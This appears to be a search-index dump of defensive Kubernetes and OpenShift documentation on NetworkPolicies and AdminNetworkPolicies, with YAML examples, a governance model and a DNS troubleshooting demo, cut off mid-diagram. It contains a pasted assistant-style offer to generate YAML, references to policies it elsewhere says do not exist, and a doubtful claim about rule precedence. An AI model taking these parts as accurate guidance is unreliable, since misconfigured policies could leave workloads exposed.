pod \"activates\" deny-by-default behavior for the directions the policy covers.</p> <p>Rule 3 - NetworkPolicies are allow-only. There are no explicit deny rules; if nothing allows the traffic, it is blocked.</p> <p>Rule 4 - Rules within a policy are OR\u2019ed: matching any rule is sufficient to allow traffic.</p> <p>Rule 5 - Policies are namespace-scoped. Cross-namespace flows require <code>namespaceSelector</code> to permit traffic across namespace boundaries.</p>"},{"location":"networking/#deny-all-example","title":"Deny-All Example","text":"<p>A default-deny policy is still the recommended first step to move pods into an explicit isolation posture:</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n````\n\nAn empty `podSelector: {}` selects all pods in the namespace and activates the deny-by-default behavior for the listed `policyTypes`.\n\n  * `ipBlock` for external networks - CIDR-based allowances for external destinations/sources.\n  * DNS is not implicitly allowed; egress to DNS (e.g., 53/UDP) must be explicitly permitted when needed.\n  * Policy evaluation is additive: multiple NetworkPolicies may apply to a pod and their allowed flows are combined.\n\nIf you want ready-to-apply YAML snippets tuned for a specific namespace and labels, or a small validation harness (pods + curl/netcat checks), say which namespace and labels to target and I will generate them.\n\n```yaml\n# ipBlock example: allow traffic from a trusted external CIDR, except a smaller excluded range\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-trusted-external\nspec:\n  podSelector:\n    matchLabels:\n      app: external-facing\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - ipBlock:\n        cidr: 198.51.100.0/24\n        except:\n        - 198.51.100.128/25\n    ports:\n    - protocol: TCP\n      port: 443\n</code></pre>"},{"location":"networking/#pattern-format","title":"Pattern Format","text":"<p>Each pattern includes: Explanation, Use Case, Risk (Why it matters), Implementation Checklist, Quick Validation steps.</p>"},{"location":"networking/#pattern-deny-all-non-whitelisted-traffic-to-a-namespace","title":"Pattern: DENY All Non-Whitelisted Traffic to a Namespace","text":"<pre><code>flowchart LR\n  subgraph ns_other [\"namespace other\"]\n    Blog[app=blog]\n  end\n  subgraph ns_default [\"namespace default\"]\n    API[app=api]\n    Guest[app=guestbook]\n  end\n  Blog -.-&gt; Guest\n  Blog -. \u274c .-&gt; API\n  API -. \u274c .-&gt; Guest</code></pre> <ul> <li>Explanation: Only approved cross-namespace flow (blog -&gt; guestbook) is permitted; other cross or internal flows are blocked.</li> <li>Use Case: Multi-tenant cluster; restrict which external namespace may call a frontend.</li> <li>Why it Matters: Reduces lateral movement between namespaces.</li> <li>Implementation Checklist:<ul> <li>NetworkPolicy selecting protected pods (e.g. guestbook)</li> <li>Ingress rules with <code>from</code> including <code>namespaceSelector + podSelector</code> for allowed source</li> <li>Specify ports</li> <li><code>policyTypes: [Ingress]</code></li> </ul> </li> </ul> <pre><code># Allow only blog pods from namespace 'other' to reach guestbook\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-blog-to-guestbook\nspec:\n  podSelector:\n    matchLabels:\n      app: guestbook\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          name: other\n      podSelector:\n        matchLabels:\n          app: blog\n    ports:\n    - protocol: TCP\n      port: 8080\n</code></pre>"},{"location":"networking/#pattern-limit-traffic-to-an-application","title":"Pattern: LIMIT Traffic to an Application","text":"<pre><code>flowchart LR\n  Coffee[\"app=coffeeshop&lt;br&gt;role=api\"]\n  BookAPI[\"app=bookstore&lt;br&gt;role=api\"]\n  BookFE[\"app=bookstore&lt;br&gt;role=frontend\"]\n  BookAPI -.-&gt; BookFE\n  Coffee -. \u274c .-&gt; BookAPI</code></pre> <ul> <li>Explanation: Frontend (role=frontend) may call bookstore API; other APIs denied.</li> <li>Use Case: Enforce intra-namespace microservice boundaries.</li> <li>Why it Matters: Prevents accidental/malicious service calls to internal APIs.</li> <li>Implementation Checklist: podSelector for API pods; ingress from frontend label; restrict ports; <code>policyTypes: [Ingress]</code>.</li> </ul> <pre><code># Allow frontend role to call bookstore API on port 8080 only\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-frontend-to-bookapi\nspec:\n  podSelector:\n    matchLabels:\n      app: bookstore\n      role: api\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          role: frontend\n    ports:\n    - protocol: TCP\n      port: 8080\n</code></pre>"},{"location":"networking/#pattern-deny-all-traffic-from-other-namespaces","title":"Pattern: DENY All Traffic from Other Namespaces","text":"<pre><code>flowchart LR\n  subgraph ns_foo [\"namespace: foo\"]\n    FooPod[Any Pod]\n  end\n  subgraph ns_default [\"namespace: default\"]\n    Web[app=web]\n    DB[app=db]\n  end\n  subgraph ns_bar [\"namespace: bar\"]\n    BarPod[Any Pod]\n  end\n  Web -.-&gt; DB\n  DB -.-&gt; Web\n  FooPod -. \u274c .-&gt; Web\n  FooPod -. \u274c .-&gt; DB\n  BarPod -. \u274c .-&gt; Web\n  BarPod -. \u274c .-&gt; DB</code></pre> <ul> <li>Explanation: Only internal namespace communication is permitted.</li> <li>Use Case: Tenant isolation; environment boundary.</li> <li>Why it Matters: Prevents privilege creep and meets audit separation requirements.</li> <li>Implementation Checklist: Policy selecting web &amp; db; ingress limited to same-namespace (no namespaceSelectors) OR selective addition for trusted namespaces.</li> </ul> <pre><code># Allow only same-namespace pods to reach web service\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-same-namespace-to-web\nspec:\n  podSelector:\n    matchLabels:\n      app: web\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector: {}\n</code></pre>"},{"location":"networking/#pattern-allow-traffic-only-to-a-metrics-port","title":"Pattern: ALLOW Traffic Only to a Metrics Port","text":"<pre><code>flowchart LR\n  Prom[\"app=prometheus&lt;br&gt;role=monitoring\"]\n  subgraph API [\"app=api\"]\n    Metrics[\":5000 (metrics)\"]\n    HTTP[\":8000 (http)\"]\n  end\n  Prom -.-&gt; Metrics\n  Prom -. \u274c .-&gt; HTTP</code></pre> <ul> <li>Explanation: Prometheus may scrape metrics port; general HTTP port is blocked.</li> <li>Use Case: Observability access minimization.</li> <li>Why it Matters: Reduces exposure of non-observability endpoints to monitoring credentials.</li> <li>Implementation Checklist: Ingress from monitoring pods; allow port 5000 only.</li> </ul> <pre><code># Allow Prometheus monitoring pods to scrape metrics port 5000\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-prometheus-metrics\nspec:\n  podSelector:\n    matchLabels:\n      app: api\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          role: monitoring\n    ports:\n    - protocol: TCP\n      port: 5000\n</code></pre>"},{"location":"networking/#pattern-deny-external-egress-traffic","title":"Pattern: DENY External Egress Traffic","text":"<pre><code>flowchart LR\n  subgraph ns_default [\"namespace: default\"]\n    App1[app=web]\n    App2[app=db]\n  end\n  External[External services / Internet]\n  App1 -.-&gt; App2\n  App2 -.-&gt; App1\n  App1 -. \u274c .-&gt; External\n  App2 -. \u274c .-&gt; External</code></pre> <ul> <li>Explanation: Internal communication allowed; outbound to external networks denied.</li> <li>Use Case: Regulated workloads (PCI, OT) requiring strict egress control.</li> <li>Why it Matters: Prevents data exfiltration and command-and-control callbacks.</li> <li>Implementation Checklist: Egress policy; allow only explicit internal destinations (DNS, logging, etc.); <code>policyTypes: [Egress]</code>.</li> </ul> <pre><code># Deny external egress except internal namespace and a trusted CIDR (example)\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: restrict-egress\nspec:\n  podSelector: {}\n  policyTypes:\n  - Egress\n  egress:\n  - to:\n    - podSelector: {}\n    - ipBlock:\n        cidr: 10.0.0.0/16\n</code></pre>"},{"location":"networking/#pattern-deny-all-inbound-to-an-application-except-specific-source","title":"Pattern: DENY All Inbound to an Application (Except Specific Source)","text":"<pre><code>flowchart LR\n  subgraph ns_default [\"namespace: default\"]\n    Web[app=web]\n  end\n  subgraph ns_foo [\"namespace: foo\"]\n    FooPod[Any Pod]\n  end\n  AnyOther[Any Pod]\n  FooPod -.-&gt; Web\n  Web -.-&gt; AnyOther\n  Web -. \u274c .-&gt; FooPod\n  Web -. \u274c .-&gt; AnyOther</code></pre> <ul> <li>Explanation: Web can make outbound calls but only FooPod can reach it inbound.</li> <li>Use Case: Backend reachable only via controlled proxy or connector.</li> <li>Why it Matters: Prevents accidental exposure and narrows attack surface.</li> <li>Implementation Checklist: Policy selecting web; ingress rule permitting only proxy label; add <code>policyTypes: [Ingress,Egress]</code> if controlling both directions.</li> </ul> <pre><code># Allow only FooPod from namespace 'foo' to reach web\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-foo-to-web\nspec:\n  podSelector:\n    matchLabels:\n      app: web\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          name: foo\n      podSelector:\n        matchLabels:\n          app: foo-pod\n</code></pre>"},{"location":"networking/#operational-notes","title":"Operational Notes","text":"<ul> <li>Selection Principle: Pods not selected by any policy remain open (all ingress/egress allowed). Once selected, only explicitly allowed traffic passes.</li> <li>Namespace Scope: Policies do not cross namespaces without <code>namespaceSelector</code>.</li> <li>Default Deny Strategy: Add an empty (or minimal) policy selecting pods to shift them into deny-by-default, then add granular policies.</li> </ul>"},{"location":"networking/networkpolicies/adminnetworkpolicies/","title":"Network Security Governance Model for Application Namespaces","text":"<p>This document defines the security posture, enforcement model, and operational workflow for controlling ingress and egress traffic in business-owned application namespaces on OpenShift. The goal is to provide strong guardrails while enabling developers to continue managing their own NetworkPolicies inside a controlled and predictable perimeter.</p>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#1-scope","title":"1. Scope","text":"<p>The policies in this document apply only to namespaces explicitly marked as application-owned:</p> <p><code>custom.security/enforce: \"true\"</code></p> <p>Infrastructure, platform, and operator namespaces are not affected.</p>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#2-security-posture","title":"2. Security Posture","text":"<p>Owned namespaces follow a closed-by-default security model.</p>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#ingress","title":"Ingress","text":"<ul> <li>External Traffic: No external traffic may enter an application namespace by default.</li> <li>Namespace-to-Namespace: Ingress between application namespaces is only allowed if explicitly passed by <code>AdminNetworkPolicy</code>; all other ingress is denied at the admin tier.</li> <li>Developer Control: Application teams must use standard <code>NetworkPolicies</code> to define pod-level ingress within their namespaces.</li> </ul>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#egress","title":"Egress","text":"<ul> <li>DNS: Allowed only to the cluster resolver (<code>openshift-dns</code>) for owned namespaces.</li> <li>Kube-API: Allowed only for namespaces explicitly selected by the <code>kubeapi-egress-guardrail</code> ANP.</li> <li>Corporate External Networks: Allowed only for namespaces explicitly selected by the <code>corporate-access-external-networks-guardrail</code> ANP.</li> <li>All Other Egress: Denied by the final default-deny ANP at the admin tier.</li> </ul>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#baseline-admin-network-policy-banp","title":"Baseline Admin Network Policy (BANP)","text":"<p>In addition to the AdminNetworkPolicies, a BaselineAdminNetworkPolicy (BANP) is enforced as a default-deny fallback for all owned namespaces. The BANP ensures that, unless explicitly allowed by a higher-tier policy, both ingress and egress traffic between owned namespaces is denied by default. This provides a strong safety net and ensures a closed-by-default posture even if no other policies are present.</p>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#developer-networkpolicy-privileges","title":"Developer NetworkPolicy Privileges","text":"<p>Within the boundaries enforced by AdminNetworkPolicies and the BaselineAdminNetworkPolicy (BANP), application developers have full privileges to create and manage their own Kubernetes <code>NetworkPolicy</code> objects in their namespaces. This allows teams to define pod-level ingress and egress rules for their workloads, enabling service-to-service communication and additional security controls as needed. However, these developer-created policies cannot override the cluster perimeter or default-deny posture set by the admin tier.</p>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#3-administrative-enforcement-anp-suite","title":"3. Administrative Enforcement \u2013 ANP Suite","text":"<p>In this environment, only the following AdminNetworkPolicies are present and enforced. Each policy is single-purpose, auditable, and mapped to a specific risk domain.</p> File Purpose Priority <code>corporate-external-networks-guardrail.yaml</code> Allow egress to specific corporate external networks for approved namespaces 12 <code>kubeapi-egress-guardrail.yaml</code> Permit kube-API access only for explicitly approved workloads 13 <code>deny-all-allow-dns-owned-namespaces.yaml</code> Default deny for all, allow DNS and pass traffic between owned namespaces 99 <p>Each file has one intent, one risk domain, one owner, one approval workflow.</p>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#31-corporate-external-networks-guardrail-anp","title":"3.1 Corporate External Networks Guardrail ANP","text":"<pre><code>apiVersion: policy.networking.k8s.io/v1alpha1\nkind: AdminNetworkPolicy\nmetadata:\n  name: corporate-access-external-networks-guardrail\nspec:\n  priority: 12\n  subject:\n    namespaces:\n      matchLabels:\n        security.allow/networks: \"true\"\n  egress:\n    - name: allow-corporate-external-networks\n      action: Allow\n      to:\n        - networks:\n            - XX.XX.XX.0/24\n      ports:\n        - portNumber:\n            protocol: TCP\n            port: 443\n</code></pre>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#32-kube-api-egress-guardrail-anp","title":"3.2 Kube API Egress Guardrail ANP","text":"<pre><code>apiVersion: policy.networking.k8s.io/v1alpha1\nkind: AdminNetworkPolicy\nmetadata:\n  name: kubeapi-egress-guardrail\nspec:\n  priority: 13\n  subject:\n    namespaces:\n      matchLabels:\n        security.allow/kapi: \"true\"\n  egress:\n    - name: allow-kubeapi-for-approved-workloads\n      action: Allow\n      to:\n        - nodes:\n            matchExpressions:\n              - key: node-role.kubernetes.io/control-plane\n                operator: Exists\n      ports:\n        - portNumber:\n            protocol: TCP\n            port: 6443\n</code></pre>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#33-deny-all-allow-dns-monitoring-and-pass-for-owned-namespaces-anp","title":"3.3 Deny-All, Allow DNS &amp; Monitoring, and Pass for Owned Namespaces ANP","text":"<pre><code>apiVersion: policy.networking.k8s.io/v1alpha1\nkind: AdminNetworkPolicy\nmetadata:\n  name: deny-all-allow-dns-monitoring-owned-namespaces\nspec:\n  priority: 99\n  subject:\n    namespaces:\n      matchLabels:\n        custom.security/enforce: \"true\"\n  ingress:\n    - name: allow-openshift-monitoring\n      action: Allow\n      from:\n        - namespaces:\n            matchLabels:\n              kubernetes.io/metadata.name: openshift-monitoring\n\n    - name: allow-user-workload-monitoring\n      action: Allow\n      from:\n        - namespaces:\n            matchLabels:\n              kubernetes.io/metadata.name: openshift-user-workload-monitoring\n\n    - name: pass-from-owned-namespaces\n      action: Pass\n      from:\n        - namespaces:\n            matchLabels:\n              custom.security/enforce: \"true\"\n\n    - name: deny-ingress\n      action: Deny\n      from:\n        - namespaces: {}\n  egress:\n    - name: allow-dns\n      action: Allow\n      to:\n        - namespaces:\n            matchLabels:\n              kubernetes.io/metadata.name: openshift-dns\n      ports:\n        - portNumber:\n            port: 53\n            protocol: UDP\n        - portNumber:\n            port: 53\n            protocol: TCP\n        - portNumber:\n            port: 5353\n            protocol: UDP\n        - portNumber:\n            port: 5353\n            protocol: TCP\n\n    - name: pass-to-owned-namespaces\n      action: Pass\n      to:\n        - namespaces:\n            matchLabels:\n              custom.security/enforce: \"true\"\n\n    - name: deny-egress\n      action: Deny\n      to:\n        - networks:\n            - 0.0.0.0/0\n</code></pre> <p>These are the only AdminNetworkPolicies enforced in this environment. All other references or examples have been removed for clarity and accuracy.</p>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#4-how-rule-types-and-priorities-behave","title":"4. How Rule Types and Priorities Behave","text":"<p>Note: The number of AdminNetworkPolicies in a cluster is typically expected to be a maximum of 30\u201350, based on the use cases for which this API was designed. In OVN-Kubernetes, supported priority values for AdminNetworkPolicies range from 0 to 99.</p>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#allow","title":"Allow","text":"<p>Traffic is permitted at the Admin tier. Lower-tier policies (BANP or developer NetworkPolicies) cannot override the decision.</p> <ul> <li>Used for:<ul> <li>DNS egress (for owned namespaces, to <code>openshift-dns</code>)</li> <li>Monitoring ingress (if included in the ANP)</li> <li>Ingress(route) (if included in the ANP)</li> <li>Kube-API egress (for namespaces explicitly selected by the <code>kubeapi-egress-guardrail</code> ANP)</li> <li>Corporate external network egress (for namespaces explicitly selected by the <code>corporate-access-external-networks-guardrail</code> ANP)</li> </ul> </li> </ul>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#deny","title":"Deny","text":"<p>Traffic is blocked at the Admin tier and cannot be overridden.</p> <ul> <li>Used for:<ul> <li>Final deny-all safety net (low-priority default-deny ANP)</li> <li>Default-deny fallback for all owned namespaces (BANP)</li> </ul> </li> </ul>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#pass","title":"Pass","text":"<p>Some ANP rules may use the <code>Pass</code> action, which delegates the decision to developer-managed NetworkPolicies or the BANP. This allows teams to define pod-level communication within the boundaries set by the admin tier.</p>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#priority-and-precedence","title":"Priority and Precedence","text":"<p>AdminNetworkPolicy evaluation is priority-driven:</p> <ul> <li>Lower number \u2192 higher priority (evaluated earlier)</li> <li>Higher number \u2192 lower priority (evaluated later)</li> </ul> <p>Within a single ANP object, a deny-all rule always overrides other rules in that same object. However, a deny-all in a lower-priority ANP does not override allows in a higher-priority ANP.</p> <p>This is why the final default-deny ANP is assigned a high numeric priority (e.g., 99):</p> <ol> <li>All allow ANPs (DNS, kube-API, corporate networks) run first.</li> <li>Any traffic explicitly allowed is permitted.</li> <li>Only traffic not matched by any allow is caught by the final deny-all.</li> </ol> <p>The BaselineAdminNetworkPolicy (BANP) acts as a fallback, denying all ingress and egress between owned namespaces unless explicitly allowed by a higher-tier ANP. Developer NetworkPolicies can only further restrict traffic within the boundaries set by these admin policies.</p>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#5-developer-workflow","title":"5. Developer Workflow","text":"<p>Developers continue to own their namespace <code>NetworkPolicy</code> objects.</p> <p>Their responsibilities:</p> <ul> <li>Define allowed ingress/egress for workloads inside their namespace.</li> <li>Maintain service-to-service topology.</li> <li>Document required communication paths for review.</li> </ul> <p>Their NetworkPolicies operate inside the Admin perimeter enforced by the ANP suite:</p> <ul> <li>They can allow traffic only to destinations that one of the AdminNetworkPolicies has <code>Allow</code>ed or <code>Pass</code>ed.</li> <li>They cannot override:<ul> <li>kube-API restrictions enforced by the kube API ANP.</li> <li>Internet restrictions and proxy routing enforced by the proxy ANP and final default-deny ANP.</li> <li>metadata blocks enforced by the metadata-deny ANP.</li> <li>ingress exposure without Security labels enforced by the ingress ANP.</li> </ul> </li> </ul> <p>The result is:</p> <ul> <li>Security controls the perimeter.</li> <li>Developers control workload communication inside that perimeter.</li> <li>Reduced risk of accidental broad exposure through permissive NetworkPolicies.</li> </ul>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#6-best-practices-and-improvements-for-adminnetworkpolicies","title":"6. Best Practices and Improvements for AdminNetworkPolicies","text":"<p>AdminNetworkPolicies (ANPs) are powerful tools for enforcing cluster-wide network security. To maximize their effectiveness and avoid common pitfalls, follow these best practices:</p> <ul> <li>Priority Management:<ul> <li>Use the supported priority range (0\u201399) in OVN-Kubernetes. Avoid priorities above 99.</li> <li>Plan priorities with gaps (e.g., 10, 20, 30) to allow future policies to be inserted.</li> <li>Limit the number of ANPs to 30\u201350 per cluster for manageability and performance.</li> </ul> </li> <li>Policy Design:<ul> <li>Prefer label-based selectors over empty selectors (<code>{}</code>) to avoid unintentionally selecting all namespaces, including system ones.</li> <li>Use <code>Deny</code> for strict perimeter enforcement and <code>Pass</code> to delegate to namespace NetworkPolicies.</li> <li>Avoid overlapping selectors at the same priority to prevent unpredictable results.</li> </ul> </li> <li>Operational Safety:<ul> <li>Always define high-priority <code>Allow</code> rules for essential services (DNS, kube-API) before applying a default-deny.</li> <li>Use <code>Pass</code> to let developers control specific flows via NetworkPolicies.</li> </ul> </li> <li>Performance:<ul> <li>Minimize use of <code>namedPorts</code> in large clusters.</li> <li>Keep address sets small and non-overlapping to avoid scale bottlenecks.</li> </ul> </li> <li>Monitoring and Troubleshooting:<ul> <li>Enable ACL logging for observability.</li> <li>Use metrics and tracing tools (e.g., <code>ovn-trace</code>) to validate policy behavior.</li> </ul> </li> <li>Documentation and Review:<ul> <li>Document the intent and effect of each ANP.</li> <li>Regularly review ANPs for unnecessary complexity and update as requirements evolve.</li> </ul> </li> </ul>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#7-example-adminnetworkpolicies-in-this-environment","title":"7. Example AdminNetworkPolicies in This Environment","text":"<p>The following AdminNetworkPolicies are present in this environment and define the security posture:</p>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#corporate-external-networks-guardrailyaml","title":"corporate-external-networks-guardrail.yaml","text":"<pre><code>apiVersion: policy.networking.k8s.io/v1alpha1\nkind: AdminNetworkPolicy\nmetadata:\n  name: corporate-access-external-networks-guardrail\nspec:\n  priority: 12\n  subject:\n    namespaces:\n      matchLabels:\n        security.allow/networks: \"true\"\n  egress:\n    - name: allow-corporate-external-networks\n      action: Allow\n      to:\n        - networks:\n            - XX.XX.XX.0/24\n      ports:\n        - portNumber:\n            protocol: TCP\n            port: 443\n</code></pre>"},{"location":"networking/networkpolicies/adminnetworkpolicies/#deny-all-allow-dns-monitoring-owned-namespacesyaml","title":"deny-all-allow-dns-monitoring-owned-namespaces.yaml","text":"<pre><code>apiVersion: policy.networking.k8s.io/v1alpha1\nkind: AdminNetworkPolicy\nmetadata:\n  name: deny-all-allow-dns-monitoring-owned-namespaces\nspec:\n  priority: 99\n  subject:\n    namespaces:\n      matchLabels:\n        custom.security/enforce: \"true\"\n  ingress:\n    - name: allow-openshift-monitoring\n      action: Allow\n      from:\n        - namespaces:\n            matchLabels:\n              kubernetes.io/metadata.name: openshift-monitoring\n\n    - name: allow-user-workload-monitoring\n      action: Allow\n      from:\n        - namespaces:\n            matchLabels:\n              kubernetes.io/metadata.name: openshift-user-workload-monitoring\n\n    - name: pass-from-owned-namespaces\n      action: Pass\n      from:\n        - namespaces:\n            matchLabels:\n              custom.security/enforce: \"true\"\n\n    - name: deny-ingress\n      action: Deny\n      from:\n        - namespaces: {}\n  egress:\n    - name: allow-dns\n      action: Allow\n      to:\n        - namespaces:\n            matchLabels:\n              kubernetes.io/metadata.name: openshift-dns\n      ports:\n        - portNumber:\n            port: 53\n            protocol: UDP\n        - portNumber:\n            port: 53\n            protocol: TCP\n        - portNumber:\n            port: 5353\n            protocol: UDP\n        - portNumber:\n            port: 5353\n            protocol: TCP\n\n    - name: pass-to-owned-namespaces\n      action: Pass\n      to:\n        - namespaces:\n            matchLabels:\n              custom.security/enforce: \"true\"\n\n    - name: deny-egress\n      action: Deny\n      to:\n        - networks:\n            - 0.0.0.0/0\n</code></pre> <p>These policies are the only AdminNetworkPolicies present and should be referenced for implementation and troubleshooting.</p>"},{"location":"networking/networkpolicies/anp-demo/","title":"Admin Network Policies - Demo","text":""},{"location":"networking/networkpolicies/anp-demo/#network-policy-troubleshooting-dns-resolution","title":"Network Policy Troubleshooting &amp; DNS Resolution","text":""},{"location":"networking/networkpolicies/anp-demo/#1-initial-state-open-communication","title":"1. Initial State (Open Communication)","text":"<p>Before applying any restrictions, traffic flows freely between namespaces.</p> <pre><code>oc exec -n team-a default -- curl -s http://default.team-b.svc.cluster.local:8080\n</code></pre>"},{"location":"networking/networkpolicies/anp-demo/#2-apply-baseline-policy","title":"2. Apply Baseline Policy","text":"<p>Applying the <code>BaselineAdminNetworkPolicy</code> (BANP) to set a \"Deny All\" safety net.</p> <pre><code>oc apply -f netpols/baselinenp-deny-all.yaml \n</code></pre> <p>Result: The same <code>curl</code> command now fails because the baseline policy drops all traffic by default.</p>"},{"location":"networking/networkpolicies/anp-demo/#3-attempting-to-restore-access-via-standard-networkpolicies","title":"3. Attempting to Restore Access via Standard NetworkPolicies","text":"<p>We try to allow specific traffic between <code>team-a</code> and <code>team-b</code> using standard Kubernetes <code>NetworkPolicy</code> resources.</p> <pre><code># Apply Egress in source namespace\noc apply -f netpols/team-a-egress-to-team-b.yaml\n\n# Apply Ingress in destination namespace\noc apply -f netpols/team-b-ingress-from-team-a.yaml \n\n# Test connectivity again\noc exec -n team-a default -- curl -s http://default.team-b.svc.cluster.local:8080\n</code></pre> <p>Outcome: It STILL FAILS.</p>"},{"location":"networking/networkpolicies/anp-demo/#4-root-cause-analysis-dns-vs-ip","title":"4. Root Cause Analysis: DNS vs. IP","text":"<p>Checking the pod IP in <code>team-b</code> to determine if the issue is the network path or name resolution.</p> <pre><code>oc get pod -n team-b default -o wide\n# IP: 10.129.1.229\n</code></pre> <p>Testing via Pod IP instead of DNS Name:</p> <pre><code>oc exec -n team-a default -- curl -s http://10.129.1.229:8080\n</code></pre> <p>Outcome: Success!</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;&lt;body&gt;&lt;h1&gt;ok&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre> <p>Conclusion: The network path is open, but DNS is blocked. The baseline \"Deny All\" is preventing pods from talking to the <code>kube-dns</code> service in the <code>openshift-dns</code> or <code>kube-system</code> namespaces.</p>"},{"location":"networking/networkpolicies/anp-demo/#5-resolution-admin-network-policy-for-dns","title":"5. Resolution: Admin Network Policy for DNS","text":"<p>Instead of manually adding DNS rules to every single namespace, we use an Admin Network Policy (ANP) to globally allow DNS traffic for the entire cluster.</p> <pre><code>oc apply -f anp-deny-all-allow-dns.yaml \n# adminnetworkpolicy.policy.networking.k8s.io/deny-all-allow-dns created\n</code></pre>"},{"location":"networking/networkpolicies/anp-demo/#6-external-bypass-test","title":"6. External Bypass Test","text":"<p>Testing if external traffic (Internet) is still blocked by the baseline policy.</p> <pre><code>oc exec -n team-a default -- curl -s www.google.com\n</code></pre> <p>Outcome: Blocked (as expected).</p>"},{"location":"networking/networkpolicies/anp-demo/#7-overriding-the-baseline","title":"7. Overriding the Baseline","text":"<p>Because <code>BaselineAdminNetworkPolicy</code> is the lowest priority, a developer can \"bypass\" it by applying a broad <code>NetworkPolicy</code> to their own namespace.</p> <pre><code>oc apply -f allow-all.yaml \n</code></pre> <p>** Outcome:** Bingo! External access to Google is now working because the <code>NetworkPolicy</code> took precedence over the <code>BaselineAdminNetworkPolicy</code>.</p>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/","title":"Network Segmentation for Defense","text":"<p>This guide applies Network Policies to enforce Zero Trust between critical application tiers (<code>frontend</code>, <code>payments</code>) to block the lateral movement attack path: <code>asset-cache</code> $\\rightarrow$ <code>visa-processor</code>.</p>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#prerequisites","title":"Prerequisites","text":"<p>To run this demo, ensure the application stack is deployed:</p> <pre><code>git clone https://github.com/ralvares/security-demos\ncd security-demos/demo_app/manifests\noc apply -k .\n</code></pre>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#application-scope-labels","title":"Application Scope &amp; Labels","text":"<p>Your application spans three namespaces: <code>frontend</code>, <code>backend</code>, and <code>payments</code>. We are applying strict isolation to the perimeter (<code>frontend</code>) and the critical zone (<code>payments</code>).</p> Namespace Key Application Labels Purpose <code>frontend</code> <code>app: webapp</code>, <code>app: asset-cache</code> Public perimeter / Entry point <code>backend</code> <code>app: checkout</code>, <code>app: catalog</code> Business logic / Transaction bridge <code>payments</code> <code>app: gateway</code>, <code>app: visa-processor</code> High-value target / Vault"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#step-1-establish-zero-trust-default-deny","title":"Step 1: Establish Zero Trust (Default Deny)","text":"<p>The fundamental step for network protection is to change Kubernetes' default behavior from Allow All to Deny All. This ensures that any traffic not explicitly whitelisted is blocked, immediately eliminating the attack vector.</p>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#pattern-deny-all-ingress-and-egress","title":"Pattern: Deny All Ingress and Egress","text":"<ul> <li>Explanation: An empty <code>podSelector: {}</code> selects every pod in the namespace, and <code>policyTypes: [Ingress, Egress]</code> applies the deny rule to all traffic in both directions.</li> <li>Action: Apply this policy to <code>frontend</code> and <code>payments</code>.</li> </ul> <pre><code># Default Deny for 'frontend' namespace\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-in-namespace-frontend\n  namespace: frontend\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n---\n# Default Deny for 'payments' namespace\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-in-namespace-payments\n  namespace: payments\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n</code></pre>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#step-2-secure-the-frontend-perimeter","title":"Step 2: Secure the Frontend Perimeter","text":"<p>After applying Default Deny, we must add back the legitimate traffic flows. We focus on the compromised service, <code>asset-cache</code>, and the primary app entry point, <code>webapp</code>.</p>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#pattern-allow-ingress-from-router","title":"Pattern: Allow Ingress from Router","text":"<ul> <li>Explanation: Public-facing applications (<code>asset-cache</code>, <code>webapp</code>) must only accept traffic from the OpenShift/Kubernetes Ingress Controller (router). This is the only way for external users to access the app.</li> <li>Why it Matters: Prevents accidental internal cluster pods from reaching public services directly.</li> </ul> <pre><code>flowchart LR\n    Router[Ingress Controller]\n    subgraph ns_frontend [\"namespace: frontend\"]\n        AssetCache[app=asset-cache]\n        CompromisedPod[Compromised Pod]\n    end\n    Router --&gt; AssetCache\n    